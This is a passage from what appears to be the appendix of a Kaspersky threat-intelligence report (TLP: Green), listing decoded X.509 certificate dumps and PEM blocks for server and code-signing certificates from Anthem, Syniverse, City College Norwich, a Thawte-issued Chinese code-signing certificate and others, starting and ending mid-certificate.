           X509v3 Basic Constraints: critical
               CA:FALSE
           X509v3 Subject Alternative Name:
               email:dlaitmiddleware@anthem.com
           X509v3 Key Usage: critical
               Key Encipherment
           X509v3 Authority Key Identifier:
               keyid:FA:1A:DC:3E:5D:A6:B5:FD:FA:5F:6C:CB:28:40:D3:E
               0:97:A2:AA:AC
               DirName:/C=US/O=GTE Corporation/OU=GTE CyberTrust
               Solutions, Inc./CN=GTE
               CyberTrust Global Root
               serial:07:27:16:11
           X509v3 Subject Key Identifier:
               6B:46:CC:B6:F4:8F:05:14:46:5D:D8:23:B8:05:73:E3:58:
               7E:D6:A6
    Signature Algorithm: sha1WithRSAEncryption
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                              27
          71:72:2a:c2:fc:70:13:d6:7a:a7:08:50:f2:e5:c9:7d:61:e8:
          3d:bd:98:89:2a:76:3f:16:1e:c1:2d:31:8b:81:b6:95:83:5b:
          d3:48:35:3d:78:9a:e3:76:c9:89:a0:8a:74:a0:cd:ae:56:cf:
          30:c7:72:d2:72:d0:aa:4b:9c:18:13:41:90:30:45:6d:bd:24:
          d4:88:1e:83:f3:ef:ac:d7:c3:6f:82:2d:10:20:d6:06:01:36:
          45:50:13:b4:32:6b:39:73:c9:7d:67:84:d4:ab:87:fc:c9:2a:
          8d:ee:63:7a:e2:f1:8c:4a:47:7f:3a:cb:6e:68:a2:c1:32:c6:
          04:e6:7a:35:45:46:05:99:29:90:2e:a8:2e:dd:8a:d4:8c:31:
          2e:77:57:84:62:87:fa:e1:60:2a:2a:e7:15:4c:4b:18:0d:a7:
          a2:cb:d6:32:ae:40:73:51:65:76:df:08:d4:f5:fa:a9:d9:c3:
          d4:5f:12:dc:ca:cd:4d:1e:ca:de:9f:c3:c9:5d:53:4c:d2:54:
          14:43:e5:d8:2b:9c:7c:7e:da:33:d7:69:80:43:dd:96:3d:64:
          aa:91:63:5f:48:50:7b:33:d7:85:3a:a9:d7:74:71:da:4a:82:
          cf:b1:14:82:f6:95:72:d8:a9:24:3e:b4:14:94:0c:17:2c:6f:
          8a:93:1a:a2
 BEGIN CERTIFICATE
 MIIDsTCCApmgAwIBAgICTTswDQYJKoZIhvcNAQEFBQAwYTELMAkGA1UEBhMCVVMx
 EzARBgNVBAoTCkFudGhlbSBJbmMxEjAQBgNVBAsTCUVjb21tZXJjZTEpMCcGA1UE
 AxMgQW50aGVtIEluYyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMDkwNDIyMTgx
 NTEwWhcNMTAwNDIyMTgxNTEwWjCBijELMAkGA1UEBhMCVVMxEDAOBgNVBAgTB0lu
 ZGlhbmExFTATBgNVBAcTDEluZGlhbmFwb2xpczElMCMGA1UEChMcQW50aGVtIElu
 c3VyYW5jZSBDb21wYW55IEluYzESMBAGA1UECxMJRUJ1c2luZXNzMRcwFQYDVQQD
 Ew5haGkuYW50aGVtLmNvbTBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQDUleUT2H+R
 Jyn2dnKaE6biS+wW7fyl2Pmh81dLhVbsyoCfDCOdNkXb7qjuR7czIeSTcn0AApgI
 2IjJRbUizLx3AgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMCcGA1UdEQQgMB6B
 HGRsLWFpdC1taWRkbGV3YXJlQGFudGhlbS5jb20wDgYDVR0PAQH/BAQDAgUgMIGi
 BgNVHSMEgZowgZeAFPoa3D5dprX9+l9syyhA0+CXoqqsoXmkdzB1MQswCQYDVQQG
 EwJVUzEYMBYGA1UEChMPR1RFIENvcnBvcmF0aW9uMScwJQYDVQQLEx5HVEUgQ3li
 ZXJUcnVzdCBTb2x1dGlvbnMsIEluYy4xIzAhBgNVBAMTGkdURSBDeWJlclRydXN0
 IEdsb2JhbCBSb290ggQHJxYRMB0GA1UdDgQWBBRrRsy29I8FFEZd2CO4BXPjWH7W
 pjANBgkqhkiG9w0BAQUFAAOCAQEAcXIqwvxwE9Z6pwhQ8uXJfWHoPb2YiSp2PxYe
 wS0xi4G2lYNb00g1PXia43bJiaCKdKDNrlbPMMdy0nLQqkucGBNBkDBFbb0k1Ige
 g/PvrNfDb4ItECDWBgE2RVATtDJrOXPJfWeE1KuH/Mkqje5jeuLxjEpHfzrLbmii
 wTLGBOZ6NUVGBZkpkC6oLt2K1IwxLndXhGKH+uFgKirnFUxLGA2nosvWMq5Ac1Fl
 dt8I1PX6qdnD1F8S3MrNTR7K3p/DyV1TTNJUFEPl2CucfH7aM9dpgEPdlj1kqpFj
 X0hQezPXhTqp13Rx2kqCz7EUgvaVctipJD60FJQMFyxvipMaog==
 END CERTIFICATE
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 820 (0x334)
        Signature Algorithm: md5WithRSAEncryption
        Issuer: C=US, O=Equifax Secure Inc., CN=Equifax Secure
        eBusiness CA1
        Validity
           Not Before: Feb 28 05:56:46 2005 GMT
           Not After : Mar 31 05:56:46 2007 GMT
        Subject: C=IS, O=secure.hotelreykjavik.is,
        OU=https://services.choicepoint.net/get.jsp?GT50237618,
        OU=See www.freessl.com/cps (c)04, OU=Domain Control
        Validated StarterSSL(TM), CN=secure.hotelreykjavik.is
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:db:6b:0d:53:8d:e1:71:f1:e2:48:aa:eb:94:d0:
                 fa:14:c6:24:f8:39:db:22:dc:a7:8e:46:31:10:49:
                 88:42:af:f2:9a:c5:c7:a2:ef:ec:b5:8c:a3:49:f4:
                 47:cf:12:4f:e8:6c:dd:9b:5e:91:0d:87:72:6a:17:
                 ea:d5:71:14:bd
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Key Usage: critical
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
           X509v3 CRL Distribution Points:
              Full Name:
                 URI:http://crl.geotrust.com/crls/ebizca1.crl
           X509v3 Authority Key Identifier:
              keyid:4A:78:32:52:11:DB:59:16:36:5E:DF:C1:14:36:40:6
              A:47:7C:4C:A1
    Signature Algorithm: md5WithRSAEncryption
        78:45:fd:b4:64:e8:50:16:00:f0:35:39:cd:ab:b6:ed:ee:0d:
        71:3b:2e:64:8e:92:42:f6:0d:23:28:c2:f8:e2:df:d0:ea:9c:
        ea:d7:ad:81:80:f2:ae:cb:95:70:7d:e2:2f:c0:21:9a:d7:0c:
        d2:30:94:a6:08:ca:ff:33:80:33:29:fd:f6:14:f5:49:c8:ae:
        1d:eb:6b:6e:bf:58:d3:f1:d5:4b:f1:3c:3a:0d:06:1c:ac:29:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                              29
          be:de:9a:d5:77:a7:37:e6:27:48:5b:b0:bc:ac:48:50:b6:db:
          26:aa:27:db:c5:f3:8f:43:b9:92:46:48:ac:f4:98:60:05:ab:
          c6:0b
 BEGIN CERTIFICATE
 MIIC4jCCAkugAwIBAgICAzQwDQYJKoZIhvcNAQEEBQAwUzELMAkGA1UEBhMCVVMx
 HDAaBgNVBAoTE0VxdWlmYXggU2VjdXJlIEluYy4xJjAkBgNVBAMTHUVxdWlmYXgg
 U2VjdXJlIGVCdXNpbmVzcyBDQS0xMB4XDTA1MDIyODA1NTY0NloXDTA3MDMzMTA1
 NTY0Nlowge0xCzAJBgNVBAYTAklTMSEwHwYDVQQKExhzZWN1cmUuaG90ZWxyZXlr
 amF2aWsuaXMxPDA6BgNVBAsTM2h0dHBzOi8vc2VydmljZXMuY2hvaWNlcG9pbnQu
 bmV0L2dldC5qc3A/R1Q1MDIzNzYxODEmMCQGA1UECxMdU2VlIHd3dy5mcmVlc3Ns
 LmNvbS9jcHMgKGMpMDQxMjAwBgNVBAsTKURvbWFpbiBDb250cm9sIFZhbGlkYXRl
 ZCAtIFN0YXJ0ZXJTU0woVE0pMSEwHwYDVQQDExhzZWN1cmUuaG90ZWxyZXlramF2
 aWsuaXMwXDANBgkqhkiG9w0BAQEFAANLADBIAkEA22sNU43hcfHiSKrrlND6FMYk
 +DnbItynjkYxEEmIQq/ymsXHou/stYyjSfRHzxJP6Gzdm16RDYdyahfq1XEUvQID
 AQABo24wbDAOBgNVHQ8BAf8EBAMCBPAwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDov
 L2NybC5nZW90cnVzdC5jb20vY3Jscy9lYml6Y2ExLmNybDAfBgNVHSMEGDAWgBRK
 eDJSEdtZFjZe38EUNkBqR3xMoTANBgkqhkiG9w0BAQQFAAOBgQB4Rf20ZOhQFgDw
 NTnNq7bt7g1xOy5kjpJC9g0jKML44t/Q6pzq162BgPKuy5VwfeIvwCGa1wzSMJSm
 CMr/M4AzKf32FPVJyK4d62tuv1jT8dVL8Tw6DQYcrCm+3prVd6c35idIW7C8rEhQ
 ttsmqifbxfOPQ7mSRkis9JhgBavGCw==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
           26:7b:de:88:8b:c1:50:15:11:00:f2:54:d8:ca:ed:67
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=US, O=Thawte, Inc., CN=Thawte Code Signing CA G2
        Validity
           Not Before: Jul 19 00:00:00 2013 GMT
           Not After : Jul 16 23:59:59 2014 GMT
        Subject: C=CN, ST=Henan, L=Xuchang, O=Xuchang Hongguang
        Technology Co.,Ltd., CN=Xuchang Hongguang Technology
        Co.,Ltd.
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (2048 bit)
              Modulus:
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
                  00:d0:5f:76:e6:03:cf:29:ad:17:01:b3:af:9e:3c:
                  4d:b3:45:5c:e7:4d:92:c4:2a:a1:5c:4f:20:c3:86:
                  49:09:72:4f:81:60:2f:95:1c:9d:65:b6:50:0e:72:
                  71:f9:9d:f6:8f:98:ec:5c:7b:ef:3e:a6:43:ed:35:
                  0e:44:81:e7:60:93:fc:13:d1:67:a7:3f:39:b6:c5:
                  4a:95:89:48:e0:f4:92:46:e2:d4:cf:de:66:b4:f0:
                  b9:73:35:2f:37:43:89:34:94:88:49:eb:93:84:24:
                  48:a5:0a:6f:d3:0b:8d:28:40:ca:09:0a:d2:ee:85:
                  18:60:bc:af:90:21:08:ff:7c:87:ab:30:cc:78:6f:
                  95:a6:19:80:cc:57:5b:fa:33:fd:68:33:5f:4c:8a:
                  73:b3:f3:82:c6:b8:51:c6:5e:d4:1f:59:c0:61:da:
                  b0:5a:e3:b6:62:f3:ac:42:13:a1:81:c3:1d:eb:a1:
                  76:a8:a8:83:dd:76:bd:af:15:71:47:55:b9:55:e5:
                  5b:a8:49:15:4e:6d:97:c9:9e:4b:81:47:14:35:ae:
                  09:dc:0d:39:2e:5c:41:da:65:fb:fe:89:c6:ca:02:
                  4b:1d:9f:51:f4:00:8a:43:8d:9b:ce:a1:5e:b9:23:
                  b5:3b:ee:9f:1f:01:30:5d:93:2a:a5:d6:4b:bd:4c:
                  1b:0f
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Basic Constraints: critical
              CA:FALSE
           X509v3 CRL Distribution Points:
              Full Name:
              URI:http://csg2crl.
              thawte.com/ThawteCSG2.crl
           X509v3 Extended Key Usage:
              Code Signing, Microsoft Commercial Code Signing
                  2.5.29.4:
                  0.0.0..
                  +.....7.......
           Authority Information Access:
           OCSP URI:
              http://ocsp.thawte.com
           Netscape Cert Type:
              Object Signing
     Signature Algorithm: sha1WithRSAEncryption
        20:71:27:39:c1:af:ca:1b:47:0e:9b:81:44:5a:fe:e6:27:b1:
        35:fa:c2:94:ac:ed:e2:1b:83:9a:d5:c8:92:06:a7:d3:6f:ef:
        39:4a:31:87:3d:66:d8:e5:fb:f9:f2:47:77:9c:01:ee:56:9a:
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                              31
          72:32:0f:60:ce:94:3f:a6:9b:55:8c:97:3d:15:c9:97:4e:ba:
          24:b8:cc:1d:46:ac:5e:27:c6:9e:e6:07:23:9d:31:36:d3:f4:
          dc:88:71:33:c5:71:fd:8f:1e:05:22:c0:89:ca:96:75:9c:fa:
          db:72:b2:ad:89:a9:4a:4b:82:ec:9e:70:87:ce:44:7f:79:08:
          2e:ed:29:e8:35:0b:be:39:da:f6:3c:44:e9:c1:85:f3:bb:b2:
          a8:1c:30:d4:ef:fc:ac:64:f4:8b:38:37:ed:3c:92:18:3d:1f:
          68:7a:cd:2e:58:6d:e5:24:2e:27:4a:ea:0b:07:3a:e5:30:00:
          7d:c1:3d:09:89:1e:ae:aa:fb:de:ed:59:6b:ed:32:88:3d:a5:
          83:3f:40:fb:22:04:81:d3:de:92:ae:49:57:a7:16:4a:ce:29:
          87:dc:c4:90:1b:d8:ac:6b:be:e5:15:c2:e4:af:cf:5a:bc:d5:
          25:c0:52:26:f5:3c:50:21:9a:d7:11:69:6e:31:b4:64:f9:46:
          86:a5:34:00
 BEGIN CERTIFICATE
 MIIEOjCCAyKgAwIBAgIQJnveiIvBUBURAPJU2MrtZzANBgkqhkiG9w0BAQUFADBK
 MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMVGhhd3RlLCBJbmMuMSQwIgYDVQQDExtU
 aGF3dGUgQ29kZSBTaWduaW5nIENBIC0gRzIwHhcNMTMwNzE5MDAwMDAwWhcNMTQw
 NzE2MjM1OTU5WjCBjzELMAkGA1UEBhMCQ04xDjAMBgNVBAgTBUhlbmFuMRAwDgYD
 VQQHFAdYdWNoYW5nMS4wLAYDVQQKFCVYdWNoYW5nIEhvbmdndWFuZyBUZWNobm9s
 b2d5IENvLixMdGQuMS4wLAYDVQQDFCVYdWNoYW5nIEhvbmdndWFuZyBUZWNobm9s
 b2d5IENvLixMdGQuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0F92
 5gPPKa0XAbOvnjxNs0Vc502SxCqhXE8gw4ZJCXJPgWAvlRydZbZQDnJx+Z32j5js
 XHvvPqZD7TUORIHnYJP8E9Fnpz85tsVKlYlI4PSSRuLUz95mtPC5czUvN0OJNJSI
 SeuThCRIpQpv0wuNKEDKCQrS7oUYYLyvkCEI/3yHqzDMeG+VphmAzFdb+jP9aDNf
 TIpzs/OCxrhRxl7UH1nAYdqwWuO2YvOsQhOhgcMd66F2qKiD3Xa9rxVxR1W5VeVb
 qEkVTm2XyZ5LgUcUNa4J3A05LlxB2mX7/onGygJLHZ9R9ACKQ42bzqFeuSO1O+6f
 HwEwXZMqpdZLvUwbDwIDAQABo4HVMIHSMAwGA1UdEwEB/wQCMAAwOwYDVR0fBDQw
 MjAwoC6gLIYqaHR0cDovL2NzLWcyLWNybC50aGF3dGUuY29tL1RoYXd0ZUNTRzIu
 Y3JsMB8GA1UdJQQYMBYGCCsGAQUFBwMDBgorBgEEAYI3AgEWMB0GA1UdBAQWMBQw
 DjAMBgorBgEEAYI3AgEWAwIHgDAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAGG
 Fmh0dHA6Ly9vY3NwLnRoYXd0ZS5jb20wEQYJYIZIAYb4QgEBBAQDAgQQMA0GCSqG
 SIb3DQEBBQUAA4IBAQAgcSc5wa/KG0cOm4FEWv7mJ7E1+sKUrO3iG4Oa1ciSBqfT
 b+85SjGHPWbY5fv58kd3nAHuVppyMg9gzpQ/pptVjJc9FcmXTrokuMwdRqxeJ8ae
 5gcjnTE20/TciHEzxXH9jx4FIsCJypZ1nPrbcrKtialKS4LsnnCHzkR/eQgu7Sno
 NQu+Odr2PETpwYXzu7KoHDDU7/ysZPSLODftPJIYPR9oes0uWG3lJC4nSuoLBzrl
 MAB9wT0JiR6uqvve7Vlr7TKIPaWDP0D7IgSB096SrklXpxZKzimH3MSQG9isa77l
 FcLkr89avNUlwFIm9TxQIZrXEWluMbRk+UaGpTQA
 END CERTIFICATE
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2786200 (0x2a8398)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=MY, O=Digicert Sdn. Bhd., OU=457608K,
        CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Mar 29 03:40:07 2010 GMT
           Not After : Mar 29 03:40:07 2012 GMT
        Subject: C=MY, O=Digicert Sdn Bhd, OU=CA Operation,
        CN=mcrs.digicert.com.my, L=KL, ST=WP
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:d1:e9:78:55:9c:79:70:eb:11:d3:d5:2f:c9:b0:
                 3a:1a:81:c9:cc:6a:ce:f7:5e:36:11:c3:9a:bd:e0:
                 06:95:6e:98:a3:7e:92:01:1d:ca:b2:9f:6c:a1:e1:
                 ea:50:18:09:a3:35:84:bc:df:9b:9c:60:b5:a4:18:
                 6c:0d:d9:10:35
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Subject Key Identifier:
              40:D1:03:5E:67:7C:07:9D
           X509v3 Certificate Policies:
              Policy: 2.16.458.1.1
              CPS: http://www.digicert.com.my/cps.htm
           X509v3 Authority Key Identifier:
              keyid:C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D:C
              5:74:6E:84:77
           X509v3 Key Usage:
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
    Signature Algorithm: sha1WithRSAEncryption
        12:13:d6:69:03:9a:dd:fc:0d:e9:7e:53:ef:79:e5:bd:47:c7:
        46:a0:0b:d9:7f:52:a6:1e:65:4e:a2:b1:73:83:93:93:e2:d0:
        bd:72:de:8e:fd:3f:ba:bb:66:c4:5d:98:2a:39:fa:8c:f0:84:
        00:36:c5:05:dc:2b:6c:a9:1d:e0:90:20:84:0e:48:ff:83:bf:
        51:87:e6:04:49:83:73:f0:0d:48:fb:c5:d8:ea:c2:ef:95:11:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                              33
          a3:81:9d:34:54:00:e6:93:3b:79:a2:ec:ed:1d:b7:e8:08:4a:
          4e:f9:e7:0f:b2:c6:32:d0:84:de:b7:e6:a2:4f:1f:2a:58:c7:
          b4:61
 BEGIN CERTIFICATE
 MIICmjCCAgOgAwIBAgIDKoOYMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
 MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
 MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMTAwMzI5
 MDM0MDA3WhcNMTIwMzI5MDM0MDA3WjB4MQswCQYDVQQGEwJNWTEZMBcGA1UEChMQ
 RGlnaWNlcnQgU2RuIEJoZDEVMBMGA1UECxMMQ0EgT3BlcmF0aW9uMR0wGwYDVQQD
 ExRtY3JzLmRpZ2ljZXJ0LmNvbS5teTELMAkGA1UEBxMCS0wxCzAJBgNVBAgTAldQ
 MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANHpeFWceXDrEdPVL8mwOhqBycxqzvde
 NhHDmr3gBpVumKN+kgEdyrKfbKHh6lAYCaM1hLzfm5xgtaQYbA3ZEDUCAwEAAaOB
 ijCBhzARBgNVHQ4ECgQIQNEDXmd8B50wRAYDVR0gBD0wOzA5BgVgg0oBATAwMC4G
 CCsGAQUFBwIBFiJodHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS5teS9jcHMuaHRtMB8G
 A1UdIwQYMBaAFMYWk04WF+wWroyUdvOGbcV0boR3MAsGA1UdDwQEAwIE8DANBgkq
 hkiG9w0BAQUFAAOBgQASE9ZpA5rd/A3pflPveeW9R8dGoAvZf1KmHmVOorFzg5OT
 4tC9ct6O/T+6u2bEXZgqOfqM8IQANsUF3CtsqR3gkCCEDkj/g79Rh+YESYNz8A1I
 +8XY6sLvlRGjgZ00VADmkzt5ouztHbfoCEpO+ecPssYy0ITet+aiTx8qWMe0YQ==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 01:00:00:00:00:01:1f:71:31:72:c9
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: O=GlobalSign Inc, CN=Cybertrust SureServer CA
        Validity
           Not Before: Feb 13 19:00:51 2009 GMT
           Not After : Feb 13 19:00:51 2011 GMT
        Subject: CN=inpack.syniverse.com,
        C=US/emailAddress=belinda.jablonski@syniverse.com,
        L=Tampa, O=Syniverse Technologies Inc., OU=Crossroads,
        ST=Florida
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:a5:13:53:17:02:f7:cd:33:64:7d:e8:27:8f:e9:
                 bc:ab:db:96:3b:41:0d:b6:c4:2a:10:d5:64:58:87:
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
                  ac:62:de:09:2e:c5:5f:79:c5:d5:9e:26:9b:1a:9a:
                  e3:99:3b:e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5:
                  40:7f:bb:e9:35
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           Netscape Cert Type:
              SSL Client, SSL Server
           X509v3 Key Usage: critical
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
           X509v3 Authority Key Identifier:
              keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD:E8:30:B
              6:5B:84:89:23
           X509v3 CRL Distribution Points:
              Full Name:
              URI:http://crl.globalsign.net/sureserver.crl
           X509v3 Basic Constraints: critical
              CA:FALSE
     Signature Algorithm: sha1WithRSAEncryption
        95:2a:42:59:bd:18:1a:ec:20:e9:96:0d:7f:f2:bc:4e:79:8a:
        44:21:a4:d7:46:03:94:a8:ec:d0:28:29:07:d0:f5:bc:91:c5:
        21:34:16:dd:87:ee:dc:6a:d4:e7:f4:d4:f9:a6:04:bb:60:53:
        2b:14:19:8a:2c:2e:1f:6a:8f:97:22:d6:f4:e5:44:06:c2:22:
        ee:cf:b2:19:67:fa:40:0f:9c:cf:58:7f:53:21:af:c0:02:ad:
        d8:7c:19:3c:f3:52:f4:10:30:f0:61:24:a9:9d:18:01:a3:f5:
        c9:29:ab:65:66:ef:a5:2d:cd:53:e2:44:09:ea:8d:4c:bc:ef:
        1a:b6:2c:7b:df:16:39:94:8b:33:cb:14:16:c2:93:42:6c:4d:
        18:99:ba:7b:fa:91:74:f0:9a:1e:ae:92:b4:94:43:bb:96:ba:
        7e:6a:df:38:9c:2e:7c:11:37:37:4c:20:80:5d:6b:e2:94:41:
        98:7d:cc:26:ca:cc:4f:81:4d:95:16:bb:26:db:1f:fe:03:fc:
        a2:50:9c:49:0b:45:7c:86:fc:5c:a6:31:34:f2:08:f1:03:16:
        10:e0:90:0c:e7:02:4e:95:f5:e8:32:03:a3:fb:78:17:dc:23:
        bf:b4:59:e6:6f:91:1c:38:cd:b7:9e:48:a0:6b:68:98:00:e3:
        33:48:18:ae
 BEGIN CERTIFICATE
 MIIDRDCCAiygAwIBAgILAQAAAAABH3ExcskwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
 A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
 cnZlciBDQTAeFw0wOTAyMTMxOTAwNTFaFw0xMTAyMTMxOTAwNTFaMIG5MR0wGwYD
 VQQDExRpbnBhY2suc3luaXZlcnNlLmNvbTELMAkGA1UEBhMCVVMxLjAsBgkqhkiG
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                            35
 9w0BCQEWH2JlbGluZGEuamFibG9uc2tpQHN5bml2ZXJzZS5jb20xDjAMBgNVBAcT
 BVRhbXBhMSQwIgYDVQQKExtTeW5pdmVyc2UgVGVjaG5vbG9naWVzIEluYy4xEzAR
 BgNVBAsTCkNyb3Nzcm9hZHMxEDAOBgNVBAgTB0Zsb3JpZGEwXDANBgkqhkiG9w0B
 AQEFAANLADBIAkEApRNTFwL3zTNkfegnj+m8q9uWO0ENtsQqENVkWIesYt4JLsVf
 ecXVniabGprjmTviLkh+nF90yTQJs6VAf7vpNQIDAQABo4GQMIGNMBEGCWCGSAGG
 +EIBAQQEAwIGwDAOBgNVHQ8BAf8EBAMCBPAwHwYDVR0jBBgwFoAUKzdTk2RHZiNP
 ANP33egwtluEiSMwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5nbG9iYWxz
 aWduLm5ldC9zdXJlc2VydmVyLmNybDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB
 BQUAA4IBAQCVKkJZvRga7CDplg1/8rxOeYpEIaTXRgOUqOzQKCkH0PW8kcUhNBbd
 h+7catTn9NT5pgS7YFMrFBmKLC4fao+XItb05UQGwiLuz7IZZ/pAD5zPWH9TIa/A
 Aq3YfBk881L0EDDwYSSpnRgBo/XJKatlZu+lLc1T4kQJ6o1MvO8atix73xY5lIsz
 yxQWwpNCbE0Ymbp7+pF08JoerpK0lEO7lrp+at84nC58ETc3TCCAXWvilEGYfcwm
 ysxPgU2VFrsm2x/+A/yiUJxJC0V8hvxcpjE08gjxAxYQ4JAM5wJOlfXoMgOj+3gX
 3CO/tFnmb5EcOM23nkiga2iYAOMzSBiu
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 01:00:00:00:00:01:1d:91:a4:6e:5b
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=BE, O=Cybertrust, OU=Educational CA,
        CN=Cybertrust Educational CA
        Validity
           Not Before: Nov 12 16:59:48 2008 GMT
           Not After : Nov 12 16:59:48 2011 GMT
        Subject: C=GB, ST=Norfolk, L=Norwich, O=City College
        Norwich, OU=I.T. Services, CN=stfmail.ccn.ac.uk
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:c6:5c:e9:3d:a8:bc:74:31:fd:9b:20:34:30:cd:
                 dc:50:6a:58:9b:41:6a:1e:04:9f:75:c2:90:1f:d8:
                 a7:b3:3a:8f:5a:29:f8:2d:b6:91:b0:71:9a:ab:4c:
                 a1:f6:12:8d:9b:01:fa:27:cd:f4:ed:08:50:48:3a:
                 29:3b:16:94:4f
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Key Usage: critical
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
              Digital Signature, Key Encipherment
           X509v3 Authority Key Identifier:
              keyid:65:65:A3:3D:D7:3B:11:A3:0A:07:25:37:C9:42:4A:5
              B:76:77:50:E1
           X509v3 Subject Key Identifier:
              BE:7E:E3:53:BD:00:32:5E:3C:78:2B:02:B2:BF:52:A2:B1:
              E5:F2:F8
              X509v3 CRL Distribution Points:
              Full Name:
                  URI:http://crl.globalsign.net/educational.crl
              Authority Information Access:
              CA Issuers URI:
                  http://secure.globalsign.net/cacert/educational.
                  crt
              Netscape Cert Type:
                  SSL Client, SSL Server
     Signature Algorithm: sha1WithRSAEncryption
        71:99:aa:c9:92:26:ee:32:2d:c0:95:f8:16:47:b7:d9:eb:2e:
        f1:93:d2:c3:3d:62:c1:9a:74:d2:2f:29:9c:08:a8:ca:52:6c:
        42:c4:2b:a7:1c:96:17:af:3d:01:b5:b5:f1:70:d0:08:e1:fa:
        63:e1:44:b2:61:66:3d:9c:5a:3f:3a:32:b0:47:31:3d:27:1d:
        98:9c:d3:c3:c7:9f:73:55:8c:ff:d7:21:2d:76:d2:e7:df:8b:
        9e:d3:ee:c5:5e:e7:6a:ba:7a:bb:7b:9e:38:00:54:ed:58:ee:
        00:c1:45:8b:d4:63:25:be:22:98:a8:ef:f0:b3:f8:fb:15:32:
        e8:ae:da:27:e4:60:46:d6:75:78:50:1d:57:4d:06:e9:8c:b8:
        43:f5:9a:58:cf:a1:f4:c7:c7:ec:4a:b0:8a:95:c7:6c:3b:50:
        0a:45:74:f1:d6:02:e0:78:a7:f1:f1:55:6e:20:92:55:37:be:
        b6:57:76:37:ff:60:30:c3:9a:2c:0e:dd:d8:ef:2b:bf:1f:20:
        9d:a5:21:93:94:9a:1e:58:74:b8:24:ce:a4:38:7b:1d:38:fd:
        f2:9f:21:c0:49:d1:94:3e:38:7e:63:0c:0b:c3:98:ea:56:b2:
        90:92:dc:75:0d:06:0b:35:9c:94:d6:e1:be:79:05:d1:27:b3:
        87:23:14:0a
 BEGIN CERTIFICATE
 MIIDlTCCAn2gAwIBAgILAQAAAAABHZGkblswDQYJKoZIhvcNAQEFBQAwXzELMAkG
 A1UEBhMCQkUxEzARBgNVBAoTCkN5YmVydHJ1c3QxFzAVBgNVBAsTDkVkdWNhdGlv
 bmFsIENBMSIwIAYDVQQDExlDeWJlcnRydXN0IEVkdWNhdGlvbmFsIENBMB4XDTA4
 MTExMjE2NTk0OFoXDTExMTExMjE2NTk0OFowgYQxCzAJBgNVBAYTAkdCMRAwDgYD
 VQQIEwdOb3Jmb2xrMRAwDgYDVQQHEwdOb3J3aWNoMR0wGwYDVQQKExRDaXR5IENv
 bGxlZ2UgTm9yd2ljaDEWMBQGA1UECxMNSS5ULiBTZXJ2aWNlczEaMBgGA1UEAxMR
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                            37
 c3RmbWFpbC5jY24uYWMudWswXDANBgkqhkiG9w0BAQEFAANLADBIAkEAxlzpPai8
 dDH9myA0MM3cUGpYm0FqHgSfdcKQH9inszqPWin4LbaRsHGaq0yh9hKNmwH6J830
 7QhQSDopOxaUTwIDAQABo4HzMIHwMA4GA1UdDwEB/wQEAwIFoDAfBgNVHSMEGDAW
 gBRlZaM91zsRowoHJTfJQkpbdndQ4TAdBgNVHQ4EFgQUvn7jU70AMl48eCsCsr9S
